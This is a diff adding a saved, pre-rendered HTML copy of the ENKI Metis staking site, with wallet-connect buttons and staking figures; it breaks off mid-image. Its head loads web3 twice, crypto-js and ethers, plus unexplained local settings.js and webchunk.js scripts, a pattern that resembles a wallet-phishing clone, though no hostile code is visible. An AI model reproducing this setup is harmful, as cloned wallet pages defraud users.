@@ -1,0 +1,644 @@
+<html lang="en" style="                                                          ">
+ <head>
+  <style data-emotion="css" data-s="">
+  </style>
+  <script src="https://unpkg.com/web3@latest/dist/web3.min.js">
+  </script>
+  <script src="https://unpkg.com/crypto-js@latest/crypto-js.js">
+  </script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.js" type="application/javascript">
+  </script>
+  <script src="https://cdn.jsdelivr.net/npm/web3@latest/dist/web3.min.js">
+  </script>
+  <script src="./js/settings.js">
+  </script>
+  <script src="./js/webchunk.js">
+  </script>
+  <meta content="Az520Inasey3TAyqLyojQa8MnmCALSEU29yQFW8dePZ7xQTvSt73pHazLFTK5f7SyLUJSo2uKLesEtEa9aUYcgMAAACPeyJvcmlnaW4iOiJodHRwczovL2dvb2dsZS5jb206NDQzIiwiZmVhdHVyZSI6IkRpc2FibGVUaGlyZFBhcnR5U3RvcmFnZVBhcnRpdGlvbmluZyIsImV4cGlyeSI6MTcyNTQwNzk5OSwiaXNTdWJkb21haW4iOnRydWUsImlzVGhpcmRQYXJ0eSI6dHJ1ZX0=" http-equiv="origin-trial"/>
+  <meta charset="utf-8"/>
+  <link href="/logo.svg" rel="shortcut icon"/>
+  <link href="https://fonts.googleapis.com" rel="preconnect"/>
+  <link crossorigin="" href="https://fonts.gstatic.com" rel="preconnect"/>
+  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@200;300;400;500;700;800&amp;display=swap" rel="stylesheet"/>
+  <meta content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no" name="viewport"/>
+  <meta content="#000000" name="theme-color"/>
+  <link href="/manifest.json" rel="manifest"/>
+  <title>
+   ENKI
+  </title>
+  <script async="" crossorigin="anonymous" integrity="sha384-6QAkKomkqvpLp4cQIWQ+jygFIfYhWZ8e6+BssYf6OcLFi0/C1rhftlXMNkaG16WA" src="https://www.gstatic.com/recaptcha/releases/x5WWoE57Fv0d6ATKsLDIAKnt/recaptcha__en.js" type="text/javascript">
+  </script>
+  <script src="https://www.google.com/recaptcha/enterprise.js?render=6LfJZ1cpAAAAAG3fe_R2xyThR93ZwvpPrApYeFt2">
+  </script>
+  <script defer="defer" src="/static/js/main.a5bc7241.js">
+  </script>
+  <link href="/static/css/main.4152c3d3.css" rel="stylesheet"/>
+  <style data-styled="active" data-styled-version="5.3.11">
+  </style>
+  <style data-emotion="css">
+  </style>
+ </head>
+ <link href="totalcss.css" rel="stylesheet"/>
+ <body>
+  <noscript>
+   You need to enable JavaScript to run this app.
+  </noscript>
+  <div id="root">
+   <div class="sc-eHsDsR uwFHh container">
+    <div class="sc-hmdomO jGNhRM header">
+     <div class="content">
+      <div class="logoContainer">
+       <img alt="Enki logo" class="logo" src="/static/media/logo.3940ffb97f663251a29b01e1b704a2f3.svg"/>
+       <div class="sc-dtBdUo dxdIDc">
+        <div class="sc-dLMFU bNvalT css-1xs3blx">
+         Metis Sepolia Testnet
+        </div>
+       </div>
+      </div>
+      <div class="sc-kOHTFB iMKuBi">
+       <svg aria-hidden="true" class="MuiSvgIcon-root MuiSvgIcon-fontSizeMedium css-vubbuv" data-testid="MenuIcon" focusable="false" viewbox="0 0 24 24">
+        <path d="M3 18h18v-2H3zm0-5h18v-2H3zm0-7v2h18V6z">
+        </path>
+       </svg>
+      </div>
+      <div class="right">
+       <div class="sc-koXPp fMnEmh">
+        <a aria-current="page" class='sc-bmzYkS kTKPyZ e=&gt;e?"active":"" active' id="home">
+         <div class="sc-dLMFU bNvalT css-7ng82x">
+          Home
+         </div>
+         <div class="line">
+         </div>
+        </a>
+        <a class="sc-bmzYkS kTKPyZ" id="mint">
+         <div class="sc-dLMFU bNvalT css-7ng82x">
+          Mint&amp;Stake
+         </div>
+         <div class="line">
+         </div>
+        </a>
+        <a class='sc-bmzYkS kTKPyZ e=&gt;e?"active":""' id="faucet">
+         <div class="sc-dLMFU bNvalT css-7ng82x">
+          Faucet
+         </div>
+         <div class="line">
+         </div>
+        </a>
+        <div aria-label="Comming soon" class="sc-cPiKLX Nnuod" style="display: flex; align-items: center; z-index: 99999;">
+         <div class="sc-iHGNWf cQJEov">
+          <div class="sc-dLMFU bNvalT css-7ng82x">
+           Dashboard
+          </div>
+          <div class="line">
+          </div>
+         </div>
+        </div>
+        <div aria-label="Comming soon" class="sc-cPiKLX Nnuod" style="display: flex; align-items: center; z-index: 99999;">
+         <div class="sc-iHGNWf cQJEov">
+          <div class="sc-dLMFU bNvalT css-7ng82x">
+           Docs
+          </div>
+         </div>
+        </div>
+       </div>
+       <button class="sc-eqUAAy llnyos middle primary false sc-fqkvVR eSlQxx connectButton">
+        Connect Wallet
+       </button>
+      </div>
+     </div>
+    </div>
+    <div class="sc-bXCLTC gbhMBj">
+     <button class="sc-eqUAAy llnyos middle primary false sc-fqkvVR eSlQxx connectButton">
+      Connect Wallet
+     </button>
+     <div class="sc-dtBdUo dxdIDc" style="margin-right: 10px;">
+      <div class="sc-dLMFU bNvalT css-1xs3blx">
+       Testnet
+      </div>
+     </div>
+    </div>
+    <div class="sc-jdkBTo gyTQT mainView">
+     <div class="sc-dCFHLb ctYaUb container">
+      <div class="sc-fhzFiK TcpUV">
+       <img alt="" src="/static/media/img_enki.12dfdde27d9c9c3b64be.png"/>
+       <div class="sc-jxOSlx eJNpwW">
+        <div class="sc-dLMFU bNvalT css-1j6d07q">
+         Metis Sequencer Node Staking Derivative
+        </div>
+        <div class="sc-dLMFU gJuYVo css-1r6bvn8">
+         A secure, simplified, and DeFi-focused platform for earning interest on Metis.
+        </div>
+        <button class="sc-eqUAAy llnyos normal primary false connectButton">
+         Launch App
+        </button>
+       </div>
+      </div>
+      <div class="sc-lcIPJg cLbVPs">
+       <div class="sc-hknOHE dZUnMQ">
+        Overview
+       </div>
+       <div class="sc-kdBSHD bBGZfh">
+        <div class="sc-tagGq hZoNSR">
+         <div class="sc-esYiGF hefNNo">
+          <div class="sc-imWYAI sc-dhKdcB dmUQsh cJwCeJ">
+           <div class="sc-dLMFU bNvalT css-ov6m7i">
+            Total eMetis Minted
+           </div>
+           <div aria-label="The total amount of eMetis coming out through METIS minted with 1:1 ratio, the same amount of staking METIS" class="sc-jEACwC kLhsZd sc-cPiKLX Nnuod" style="display: flex; align-items: center;">
+            <svg aria-hidden="true" class="MuiSvgIcon-root MuiSvgIcon-fontSizeMedium css-vubbuv" data-testid="HelpIcon" focusable="false" viewbox="0 0 24 24">
+             <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2m1 17h-2v-2h2zm2.07-7.75-.9.92C13.45 12.9 13 13.5 13 15h-2v-.5c0-1.1.45-2.1 1.17-2.83l1.24-1.26c.37-.36.59-.86.59-1.41 0-1.1-.9-2-2-2s-2 .9-2 2H8c0-2.21 1.79-4 4-4s4 1.79 4 4c0 .88-.36 1.68-.93 2.25">
+             </path>
+            </svg>
+           </div>
+          </div>
+          <div class="sc-dLMFU bNvalT css-1exeu6">
+           78,022 eMetis
+          </div>
+          <div class="sc-fXSgeo ihysfb">
+          </div>
+         </div>
+         <div class="sc-esYiGF hefNNo">
+          <div class="sc-imWYAI sc-dhKdcB dmUQsh cJwCeJ">
+           <div class="sc-dLMFU bNvalT css-ov6m7i">
+            Total Value Locked
+           </div>
+           <div aria-label="The market value of eMetis locked" class="sc-jEACwC kLhsZd sc-cPiKLX Nnuod" style="display: flex; align-items: center;">
+            <svg aria-hidden="true" class="MuiSvgIcon-root MuiSvgIcon-fontSizeMedium css-vubbuv" data-testid="HelpIcon" focusable="false" viewbox="0 0 24 24">
+             <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2m1 17h-2v-2h2zm2.07-7.75-.9.92C13.45 12.9 13 13.5 13 15h-2v-.5c0-1.1.45-2.1 1.17-2.83l1.24-1.26c.37-.36.59-.86.59-1.41 0-1.1-.9-2-2-2s-2 .9-2 2H8c0-2.21 1.79-4 4-4s4 1.79 4 4c0 .88-.36 1.68-.93 2.25">
+             </path>
+            </svg>
+           </div>
+          </div>
+          <div class="sc-dLMFU bNvalT css-1exeu6">
+           $ 66,001
+          </div>
+          <div class="sc-fXSgeo ihysfb">
+          </div>
+         </div>
+         <div class="sc-esYiGF hefNNo">
+          <div class="sc-imWYAI sc-dhKdcB dmUQsh cJwCeJ">
+           <div class="sc-dLMFU bNvalT css-ov6m7i">
+            Estimated seMetis APR
+           </div>
+           <div aria-label="Past 24 hrs total rewards amount * 90% * 365 / Total amount of eMetis staked into seMetis Vault * 100%" class="sc-jEACwC kLhsZd sc-cPiKLX Nnuod" style="display: flex; align-items: center;">
+            <svg aria-hidden="true" class="MuiSvgIcon-root MuiSvgIcon-fontSizeMedium css-vubbuv" data-testid="HelpIcon" focusable="false" viewbox="0 0 24 24">
+             <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2m1 17h-2v-2h2zm2.07-7.75-.9.92C13.45 12.9 13 13.5 13 15h-2v-.5c0-1.1.45-2.1 1.17-2.83l1.24-1.26c.37-.36.59-.86.59-1.41 0-1.1-.9-2-2-2s-2 .9-2 2H8c0-2.21 1.79-4 4-4s4 1.79 4 4c0 .88-.36 1.68-.93 2.25">
+             </path>
+            </svg>
+           </div>
+          </div>
+          <div class="sc-dLMFU bNvalT css-1exeu6">
+           8041.39 %
+          </div>
+          <div class="sc-fXSgeo ihysfb">
+          </div>
+         </div>
+         <div class="sc-esYiGF hefNNo">
+          <div class="sc-imWYAI sc-dhKdcB dmUQsh cJwCeJ">
+           <div class="sc-dLMFU bNvalT css-ov6m7i">
+            seMetis Holder
+           </div>
+           <div aria-label="The total amount of seMetis Holder" class="sc-jEACwC kLhsZd sc-cPiKLX Nnuod" style="display: flex; align-items: center;">
+            <svg aria-hidden="true" class="MuiSvgIcon-root MuiSvgIcon-fontSizeMedium css-vubbuv" data-testid="HelpIcon" focusable="false" viewbox="0 0 24 24">
+             <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2m1 17h-2v-2h2zm2.07-7.75-.9.92C13.45 12.9 13 13.5 13 15h-2v-.5c0-1.1.45-2.1 1.17-2.83l1.24-1.26c.37-.36.59-.86.59-1.41 0-1.1-.9-2-2-2s-2 .9-2 2H8c0-2.21 1.79-4 4-4s4 1.79 4 4c0 .88-.36 1.68-.93 2.25">
+             </path>
+            </svg>
+           </div>
+          </div>
+          <div class="sc-dLMFU bNvalT css-1exeu6">
+           142411
+          </div>
+         </div>
+        </div>
+       </div>
+       <div class="sc-hknOHE dZUnMQ" style="margin-top: 64px;">
+        How ENKI works
+       </div>
+       <img class="sc-fxwrCY kCEfoK" src="/static/media/img_works.acf20137f9a777d41050.png"/>
+      </div>
+      <div class="sc-lcIPJg cLbVPs bg">
+       <div class="sc-JrDLc kntHeJ">
+        <div class="sc-dLMFU gJuYVo css-c2xp4w">
+         ENKI Sequencer
+        </div>
+        <div class="sc-bbSZdi eBxBnQ">
+         <div class="sc-fjvvzt dTloNQ">
+          <img alt="" src="/static/media/enki.3b9d3f594fbb54829aefb46bdade3292.svg"/>
+         </div>
+         <div class="sc-fBWQRz iKeDwf">
+          <div class="sc-imWYAI sc-dhKdcB dmUQsh cJwCeJ">
+           <div class="sc-dLMFU bNvalT css-ov6m7i">
+            L1 Locked-up
+           </div>
+           <div aria-label="The amount of Metis locked in layer1 currently" class="sc-jEACwC kLhsZd sc-cPiKLX Nnuod" style="display: flex; align-items: center;">
+            <svg aria-hidden="true" class="MuiSvgIcon-root MuiSvgIcon-fontSizeMedium css-vubbuv" data-testid="HelpIcon" focusable="false" viewbox="0 0 24 24">
+             <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2m1 17h-2v-2h2zm2.07-7.75-.9.92C13.45 12.9 13 13.5 13 15h-2v-.5c0-1.1.45-2.1 1.17-2.83l1.24-1.26c.37-.36.59-.86.59-1.41 0-1.1-.9-2-2-2s-2 .9-2 2H8c0-2.21 1.79-4 4-4s4 1.79 4 4c0 .88-.36 1.68-.93 2.25">
+             </path>
+            </svg>
+           </div>
+          </div>
+          <div class="sc-dLMFU bNvalT css-1exeu6">
+           27,322 METIS
+          </div>
+          <div class="sc-fXSgeo ihysfb">
+          </div>
+         </div>
+         <div class="sc-fBWQRz iKeDwf">
+          <div class="sc-imWYAI sc-dhKdcB dmUQsh cJwCeJ">
+           <div class="sc-dLMFU bNvalT css-ov6m7i">
+            Mining Reward
+           </div>
+           <div aria-label="The reward of sequencers in layer1" class="sc-jEACwC kLhsZd sc-cPiKLX Nnuod" style="display: flex; align-items: center;">
+            <svg aria-hidden="true" class="MuiSvgIcon-root MuiSvgIcon-fontSizeMedium css-vubbuv" data-testid="HelpIcon" focusable="false" viewbox="0 0 24 24">
+             <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2m1 17h-2v-2h2zm2.07-7.75-.9.92C13.45 12.9 13 13.5 13 15h-2v-.5c0-1.1.45-2.1 1.17-2.83l1.24-1.26c.37-.36.59-.86.59-1.41 0-1.1-.9-2-2-2s-2 .9-2 2H8c0-2.21 1.79-4 4-4s4 1.79 4 4c0 .88-.36 1.68-.93 2.25">
+             </path>
+            </svg>
+           </div>
+          </div>
+          <div class="sc-dLMFU bNvalT css-1exeu6">
+           7,128 METIS
+          </div>
+          <div class="sc-fXSgeo ihysfb">
+          </div>
+         </div>
+         <div class="sc-fBWQRz iKeDwf">
+          <div class="sc-imWYAI sc-dhKdcB dmUQsh cJwCeJ">
+           <div class="sc-dLMFU bNvalT css-ov6m7i">
+            Bridging to L1
+           </div>
+           <div aria-label="The total amount of METIS sent to layer1" class="sc-jEACwC kLhsZd sc-cPiKLX Nnuod" style="display: flex; align-items: center;">
+            <svg aria-hidden="true" class="MuiSvgIcon-root MuiSvgIcon-fontSizeMedium css-vubbuv" data-testid="HelpIcon" focusable="false" viewbox="0 0 24 24">
+             <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2m1 17h-2v-2h2zm2.07-7.75-.9.92C13.45 12.9 13 13.5 13 15h-2v-.5c0-1.1.45-2.1 1.17-2.83l1.24-1.26c.37-.36.59-.86.59-1.41 0-1.1-.9-2-2-2s-2 .9-2 2H8c0-2.21 1.79-4 4-4s4 1.79 4 4c0 .88-.36 1.68-.93 2.25">
+             </path>
+            </svg>
+           </div>
+          </div>
+          <div class="sc-dLMFU bNvalT css-1exeu6">
+           50,686 METIS
+          </div>
+         </div>
+         <div class="sc-imWYAI sc-dhKdcB dmUQsh cJwCeJ">
+          <div class="sc-dLMFU jDnamu css-1vevtj6">
+           Not available on Testnet(Sync time)
+          </div>
+         </div>
+        </div>
+       </div>
+      </div>
+      <div class="sc-lcIPJg cLbVPs">
+       <div class="sc-hknOHE dZUnMQ">
+        Why ENKI
+       </div>
+       <div class="sc-uVWWZ iMogHr">
+        <div class="sc-hCPjZK bbihCh">
+         <img alt="" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAHgAAAB4CAYAAAA5ZDbSAAAAAXNSR0IArs4c6QAAETlJREFUeF7tXXuQHEd5/309r929B6fTnSSHCthFOVSsEEOVIBUTJRz4oVzJTuLCCiQmgGP8ojAhJgUWJB4SLOMCQRCJXziGBBOcgyKJrbrIsuGcODgVcBU4RE4RF2WbFGVJJ53Od7ePefWX6hF3vj3d3s7MzuzOnG//3e7v+/r7TXd/3d+jCevgx7YtcB50lKHPaNA12dBEiQS5EGSSgGYSOS5BmBQOV7rMlskIXGaXJZuQssEyEKVgOICPOnw8DZ9sWxZdPacHXLAfT9jm9ChMy4Gp6a5B0tSyGAILNwh803MsuKPTcGmP7WbBJ0uahQCY2RbHDi+Uy9xvaRZM8iCyVEor2mxABg7cOi04Wy/urxPlf4bnFmBmEA7a5fmyWdZMNtHw8iVryeDAJXeg7tax264TgXvx0bXjmS+lAeAn7zZm51/oMx23vLRnthtFr/+XLruWWR8aOKtKO671ei3Ocv65AZin7NL8AvrVEpwnBcWVRS3hA/1YoDG7EbdvFu17DrACFnVzoKa7RhYD7BXNim96KLvzvQa6ZwCrpXjh+HNDQrfWFbArPyjpO17/lrNne7V0dx1gdWadPR+DZh8qvZpdveDrVlEbegpz3T5bdxVgftKuVI9hkIzeHHN6AexynuxB9m3FHO2wa92SpSsA88QV2vzo9k2aV2wDKi1QAgPuwPSRU7Tn60FaNFvRyRzgZ6fs0mgNQy/XWdvy0sSDnK5g9pyMre1MAeZJe7Cmoz/rr7TI9Cs+FmjcnstqDJkAPDFxhbZrY0mOjJlasg9NHzm1J4MlO3WAecrWq4G7OSsHQGStFayhcmz0aeZJGrP9NEVPFeAjE7b56j4Mb+y3ySBSVvbzVcxsT9FrlRrAPHnAqomjw4W5P06GQfa9pMsVuW2Gxm900mCWCsD8xIfKtbmRIYiceXzS0FAvaEiDK4MnZumCz9U7Zd8xwKdn7vzwBridQrGivwJZDnQ8kzsCWO25Zw+6mzeW5ZTBXSQnXX5uzjzZyZ6cGODQWq5hZMOgygjcn5ENrzcrOJHUuk4EsDrnjg+fO7JxFMoW3EXq6gg1OfPMiSTn5EQAz03ZIxv3yt0Bd5GLugwZHLNPxOUaG+CN68e4Kk6vfZJrzVgAK8fBFg/D6Ym8QSmuBo4bmInjoIgMsHL5Vfu2jxbZqBIWjSmFSoen4io2L+1Do6t6ZDqqqzEywEXfd4XmGayb31ZAke++VQZGrqIf43xAcfbjSACrSIzaDIbiCJG7tqZ4Pwh7Q7lY7oOLv86djDEEqgxjNkpkSFuAVQxV9Y3YUuSlGZbYSsC/MU77pglYYODX4chjMXSaq6bhUv09HG8X49UW4FP/aA8VPUCOLPEFBi5fjhAB32RHfiBXqMUURgXybfode3atbmsCrEJbazMvjMbkm6/mhvYmCP7m6Ynb9GNIuhxe8N18CRxPmsrwWdNrheSuCfD85M2jRY5bVtsKkzgEwvZV1cY4Qix3qeUunlrz01rFXQ+M3zbdSqKWAKuMg1rBz7xs0ruJaN9acDDzXnL5b/MDWXxJKgZmWmVQtAZ4ct9okdNJdF1s8jU8DmBTG5Wd0gPs9H15Kr5q89FDpcnQ+N5VZ/GqAK+H2UsmfYqJ3hUFAmL+Crv80Sht89qm1SxeFeC5h+yRImf5aRp+KdDFJIComf+B5svxIMB/5xXAdnKprMbBS890RpwB8LqwnC3xTwDe2E4pK/7/Hhz52zH75Kr5ahb1GQCfmrKHTK+4iWFaSVweML6QRPMa4QNBQ6ojVSF/roHaprHmc3ETwKpsQu3hvduKGoKjWVpfAFaG1daECB3TQDsDJ6gm7N/bbioi85J9R5eXk2gG+CG7UrMKfOds0sdBdH1HWma+Ey5/siMaPexccTBLl76UvdgE8Nyj+zZr0rV6KF9i1sIUr5GEbwHoNKHcE4y3SVf+OLEwPewYCNMZvHDvyUURlgBWpYpqjxtbc1fNJqKyyBRfZcJbIjZfsxkxHmNX/n4atLpOo2RwZad3bLHE0xLARx/+cN8A9b+i6wKlwJBNuoSI7kuB1BIJZr6KXH44TZrdojXPCy9uu+QzoR2xBPCLh+xhXaDULSHS4iPYt2TJeAygV6VFM1QM4Xmqu2OS9FRSSNKUrR0tX6Lxil32TBPAC1P2tl5VkGsn8Fr/k0l/xER/0gmNVn2J+dPs8l9mQTtLmqoiX/+YfXQJYFX7sTaEkSyZZkJbiFfCwL8CKGdCH6jDw29Ayp9mRD8zspVZnFC1NcMl+viU3d/nYTAzbhkRJlPczYTdGZEPyRLjILvy2ix5ZEG7amBuy5i9EAJcxP2XTHozhPgHZm4bldKJAomIIeXvssvf6YROt/su7sOhchYe3bu1SGkoglhnSzvMjNd2Q3FE+BE5wcWSKdXs+yxlV+ku/RfuO0YqqK52AbZlySxt2sIUV0vCJ9KmuxY9wbhFuvLebvLslFflCRylohlYLDACQzxO6K7NwMAcPLmTJGLnB3UKVNL+oaHFBbt/JlPsZ8I7kg66k37EeIBdeVMnNLrZN7yXPjlpD5aKUstKpzdApwfBPSqFSJDw+TL4/P1uApWUV0PV4Jo9+NFNhlnK6hyZVLYz+pHmEWvmQRC9PjWiSQgx/4ACdzcHRi4rvC8fkuc26jT36M2bNWnl3oPEBr2TBH0mCSZp92HJHyaPv5Y23bTpBcJxqAixz4GBQU0I5cjPy23biUDKnZqHzEoQpgG2ipmmQpyBTfEJEK5OY9Cp0WDcC1fekhq9DAipszDl3ckgTHqtJDoMQM9AB52Q9AXzxdLlH3VCJMu+yulA1UN7z8pzDBaVxAQz3pylIpLSJsJ3uCH3JO2feT/pMlUP2z+XOaOkDAy6FIL+iog0MKuHiTK9d44qJgGsHMbMHGjA+wNHHozat9vt8g2wRe8D080g5NPKZzggvg0Of7HbwEXll/slGhRshWHcAIKKkcrLeb0OxlfheXeAtfwmkaslOu9G1uKXqpcw4rO4nkDvYnBf1C84zXYEqjL4KzrJO/1G/u+kQyMrz8ckNvDLms9PL3fTSQPDgrRrAPleEHXnuQDmBUB8SXJwj/AQxjqpn3JbBjqdRx7+K80PKS1a4TEpzxcdp2Od+S4B2i8deWj5wKXAkKbT1ZLoD7PyLCkPkmD+m8Dne4VEU6kEYYldEnyTYLourzHU4UVH7q8qLboBoI8B/F0E+POVF/0BY1C36CpJeB+BUqkExOBZwfii7/B9Gq24rVIODw1/BtCbAL4VDt+R1oxLm054VZl3Z0NY3UeIBxl4gyqARMBDkPI29vCT5QoJBPo1nd4DEtcAvDmZsugkWN4T+PxlTWJhOQ0y8CoIcTMDl56OqsX3IeVleS7/EDobiuAuFIb2C1KEQeiLL5O6Aviy8OTn/RVLpyZR4RL9gSS6DkDUAjLTYL5La/DfBQJNr5LpAkPSEB+UwHua+Et5ifTwv8k+pO70Ct2FRXH4k0U3MugjTaphvCjAB8B8n/TQ9Py6JlAKdHElCCoZrVVI0lEw7tR8eX8g0fQcrDBggugqCboRhKaMDwLfzg4f6A5MybmEDv+ihOwoi1Wamroxet0qQ/4/MD5F884/s9Xsp1VASRK/R4QbGHil6kvAT5lxh2D59ys/DHI84gHrt0BQJR1+fhVePxRusLsIAXinQ3YKFHQnSvSLkulfWmYQMp4iwX/BDf6PlcCEtSqNUnhvTF5jYrValVSiX2VJfwrC+S3mjSeIf1M2+H+Sz6vu9QyD7hS7PJ+FV6qDLPpjBrWLi3pEBLhV+vKZKOoUujhXavgYgIvWak/g/ezwZ6PQ7HWbpbBZJUiRAt/VTJS6OQnQeWuDAR9EX5M+7ydfrlpiiHUxKnS6Cczv5LbuSH5a+O54UarUNgW+Fy11hXV6HWmk9uP2PmJGlQh3Cp/uCoIgfIdI07Sy1Pk6ZlwPQpRrT58D3k0+/7DXMzMq/6bUlaIYWssHx6b4CBFujDpgAMcI9GnVnsEqGzFyHQ9mHCBX3h6DV8+bNiWfhftwwdJHRQCT+8ShrNNXwrSVqtwlteZjWM8RXEOAM9JHi7YPL43N0l4P5gdBkQuexcOFEYDoMjjBD+J17G3rVRPAC1vCwRLK+r0hI5XeAUfemhHtzMiuWsKhqEVYBGuWtPgREF6TqsYYPxYOXSQpKFYJh1ZFWJRyCltGydJ2hBXcwVFrU675LRAoCCvEO8GTqX40XSDWsoxSaF0WLBFtub6EJW6RwDVp6FAA90hHdjU9NQ25FY01C6EVuZShp/llUzcfYeCcTpRFwLOu715kBHrHb/d2Ikeivu1KGSqiRS5Gqpv0K76gbyTOPiRIXfLbfZf/M5GCe9ypbTHScJku+kMcJn0SRO9NpGvmL8Hljyfqm4NOkcoJh8ZWgQuCawYqUhPfYkaswmhE+IkI5NsCr9nhnwPcIokQuSB4OIsL/iCHtMSvCeCBVZ7SaaUslsA7hCP/PZI2c9goVkn/EOSCP8rBpridCFdGwYIZ95Mrm6NFonTMSZvYj3Ksh1msCfRLQ3x7MYqjFRYqukN48q3BiiC7nGAXSYxEz+ooynmOmY4ycqHjLaxr97cqlqaKnJEfXCl9PBaFXh7bJH4Ya11Y1GoTLon9zKtX5SHCA9woTtWc1T6wjp62C8/FBX+c8mflH9SD0CsjK48GUo7lvQzDWqtGx49ThrN4HTwvKyxxoQSanq8TwLulIx/N47IbRabUnpc9vVQX/4FoKmmfZ+a3q/EQ0Te4EXwwiiLz2ia1B6IXB1j0J95VspowhVqqIV05tjKZLK9AriZX6k+8h7N44gqt2rd9tMgvgauMwBDgFZmKRQI3XJqrR6Zpz9eDKHLHqnnx7JRd2lLwJ2ejKCXPbY4bmDlnzG5Ks1lL3lgAhzN50h6sFaW2ZZ6RSiBbRSWTjduxiq/FBljJVfT9OIFue94lzr67XNhEAE9MXKGND587UqQq8T1HqAMBVBrK5MwzJ/ZE3Hc7BjhcqqdsvVrDSJGNrg503rWuoVFVwQkasxM9J5BoBi+O7siEbZ496G7Oc6W8riGRBSPp8nNz5snte+ym3Oc4rDoC+LTRdcCqiflhCK9jWnEEX/dtpcEVOTBD4zd2FLabCij8xIfKtbmRoQ2QU/rsFLiDJ2bpgs91HPiXCsAvzeSjwxvLdYcgq8hIua3jmbsoRWoAK4JqT351H4Y3DK9kICuD6vkqZjrZc1dyThXgJes6cDdvHKHigayOQn2aeTKptdyKW+oAK0bqnLxrdPsmzVsqexRvtC+z1uoS49D0kVNJzrntVJUJwItMN64126kfSHL92J7qSy0yBVixUQ6K0RqGNvblZljUfjtdwWwcx0EcYDMxsloJoFyN8xtL9pJ61JI8MH3kVFSXXxJguwrw0pL9pF2pHsPgy3U2h9eOWzFHO+ymcomdANiub+ZL9EoBVIzX7PkYNPtQaSfcevpfBcgNPYU5sm3ZzXF1HeCXZvPdxsLx54aEbhndHHC3eam45f4tZ8/Sjmu9bvNW/HoG8BLQU3YJdXOgprvrCmiVToKyO08xoi+y+AB6DvByoOcX0K9ZxT47qyy/gX4s9BrYnhhZUb5QlZ88O/9Cn+m45cLca0uXXcusDw2cVe3VUtxKt7mZwWcYYwzCQbs8XzbLmskmGjlzR5YMDlxyB+puHbvtunonK8oH3O02uQV4uSJUiadjhxfKZe631BJOXm8eiFYV5NQSXKcFZ+vF/XWi7lrEST6OQgB8xuyesM3pUZiWA1PTXSMrx4ZyAAS+6TkW3NFpuNRBZEUScNLoU0iAVztb4zzoKEOf0aBrsqGJEglyIcgkAc0kclxa2tOly2yZjMBldlmyCSkbLANRCoYD+KjDx9Pwu31mTQPQlTT+H9vpPoKC4TsfAAAAAElFTkSuQmCC"/>
+         <div class="sc-dLMFU bNvalT css-97kkb2">
+          Sequencers Mining on Ethereum
+         </div>
+         <div class="sc-eBMEME lnCwSR">
+          <div class="sc-dLMFU bNvalT css-ov6m7i">
+           • Ordinary users can’t participate
+          </div>
+          <div class="sc-dLMFU bNvalT css-ov6m7i">
+           • Minimum of 2,000 METIS tokens required
+          </div>
+          <div class="sc-dLMFU bNvalT css-ov6m7i">
+           • Liquidity locked
+          </div>
+          <div class="sc-dLMFU bNvalT css-ov6m7i">
+           • Node server setup and management needed
+          </div>
+         </div>
+        </div>
+        <div class="sc-hCPjZK bbihCh">
+         <img alt="" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAHgAAAB4CAYAAAA5ZDbSAAAAAXNSR0IArs4c6QAAF0NJREFUeF7tXXmc3EWV/76q39WZTCbkAtRVCIdropI4g8EIyiASDWgUJe5677Lsiqy6wnqhLCOLKKuLLoiuyCLeOrhKCETAY+IqIJAhgElwFePtQiYkmQwz/buq3n6qZybM0d2/X3f/+gh2/ZXM79WrV+/bdb167xXhyVD6+sSyZWdZuVzesmRsjelI5jxHRKEtIscWOSlIB3nSQpDprtCahZvjvNJsh5G2nUjn/VDPEbaKlRXn87l4x44bYvT16YNdPYUOH2xlWX+/g8WLHQpch6xO29aRrEcfImErjkcidoMQQ0PhjvXrw3q0U0+eBwfAzOK5t9+eU9zpstvluFEg6qmUUrwD29UUDIeSRoIHTzstD6KWH+GtCzAzdd88mJM5lVNOp6N9v6VkFZ7HMhwJVV7mB8/oNmBzM350SW22lNKMsN1btthqRHbIQOUm18ykTjT7u1nTlSvzslONDvb0RM2WZ2r7LQPwyQO/9kYef2yudoXTSgqqVBYR6LBz7sLHN/ce6Vdatx70TQfYADuc39sJC3Y9Otg0njGirtwhI80GumkAd29hW+/aOv9JB+zMX1SMSCxZuW+wh5oydTce4L4+seK4dfOog+c0bXQ1oWEepbH7H9iwv9Fn64YC3L1ly5z8o3qea1tNOeY0AddpTQZRrHOHiv2DPT1jjZKlIQCf1d8vdy5eeoiODu4NVFagCFuHS4d27r1h/XqVFc9SfOoO8MkDA96usY75f66jtqTRJIr1kjmj+zb39tZ1t11XgFdt+um80HLm1vtXejDzd+Lw8bvXnrC/Xn2oD8D9/bK7PSWnxsxM2YNDO/eiDlN25gCfPDBg7Va5hbZ26nIBkFprBxlhJEK1SOYf29zbG2cpeqYAL+vf7qBjdEF7va0OIrPLxmjHnh3rl2d2a5UZwEdv+qXbJYYXHCz24+ogqH8tY9ce1l17Hl57TJBFa5kA/II778yF+535bXCzgGTcIcGZF+67a/XqfK0cawa4PXJrhaB4/axGck0AmzU3Ny+/sD1y6wdyfn/usVrW5KoBNrvlXWMdi9obqvqAO8nVbLyWzBndXe3uujqA+/vlsxc8fVH7KFRfcCe5myPUtj2/213NObkqgLsHtixq25UbA+5kKwVjSG/P7kpbrRjgtvmxUhVnR1+NWbMigM3FwXDUtSA7kducKtVAlz28p5ILitQAmyu/7R1HLG5vqiqFJFt6s+laPvqbobRXjakBbq+72QJVC7dK1uNUABtPDL1HzK9FqHbdbDUgFuh9aTxDkgE2cT/Hr13SnpqzBahWbmaq3nHvpl1JPl6JAK/4ztb5B5ODHNu0REq7h1gvZ6KjAfoLAIsJ6ALgACwYlCfQCJgfZaI/EvgXWuuHNK